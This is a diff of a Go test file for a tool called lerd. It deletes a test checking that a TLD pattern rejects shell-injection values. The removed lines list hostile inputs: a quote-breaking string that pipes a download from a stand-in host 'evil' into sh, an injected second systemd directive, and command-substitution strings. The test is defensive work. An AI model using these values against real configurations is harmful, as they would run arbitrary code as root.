@@ -759,27 +759,6 @@ func TestDummyLinkGrantsLive_runsAGrantedCommandRatherThanAskingSudoL(t *testing
 	assertContains(t, probe, `"sudo", "-n"`)
 }
 
-// The TLD is interpolated into the shell command of a root-owned systemd unit
-// that lerd writes and starts through its own passwordless sudo grants, so a
-// config.yaml carrying a crafted dns.tld would be arbitrary code as root. Nothing
-// that is not a DNS label may reach ConfiguredTLD's callers.
-func TestConfiguredTLD_rejectsAnythingThatIsNotADNSLabel(t *testing.T) {
-	for _, bad := range []string{
-		`test'; curl http://evil/x | sh; #`, // closes the ExecStart quote
-		"test\nExecStart=/bin/sh -c 'id'",   // injects a second unit directive
-		"$(id)", "`id`", "te st", "-lead", "trail-", "", "../../etc",
-	} {
-		if tldPattern.MatchString(bad) {
-			t.Errorf("tldPattern accepted %q, which would reach a root shell", bad)
-		}
-	}
-	for _, good := range []string{"test", "dev", "local8", "my-tld", "x"} {
-		if !tldPattern.MatchString(good) {
-			t.Errorf("tldPattern rejected the usable TLD %q", good)
-		}
-	}
-}
-
 // Belt and braces: a TLD that passes the pattern lands in the unit as an inert
 // word and cannot terminate the quoting around ExecStart's shell command.
 func TestLerdLinkUnit_tldLandsInertInTheUnit(t *testing.T) {
